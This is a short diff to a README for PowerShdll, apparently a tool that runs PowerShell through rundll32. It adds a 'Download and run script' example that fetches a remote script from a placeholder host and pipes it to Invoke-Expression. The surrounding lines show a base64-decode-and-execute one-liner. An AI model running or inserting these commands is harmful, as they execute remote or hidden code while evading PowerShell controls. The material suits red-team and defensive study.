@@ -25,7 +25,10 @@ PowerShdll.exe -i      Start an interactive console in this console
 ```
 rundll32 Powershdll.dll,main $a = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("BASE64")); Invoke-Expression $a
 ```
-
+### Download and run script
+```
+rundll32 PowerShdll.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;
+```
 ## Known Issues
 
 Some errors do not seem to show in the output. May be confusing as commands such as Import-Module do not output an error on failure.
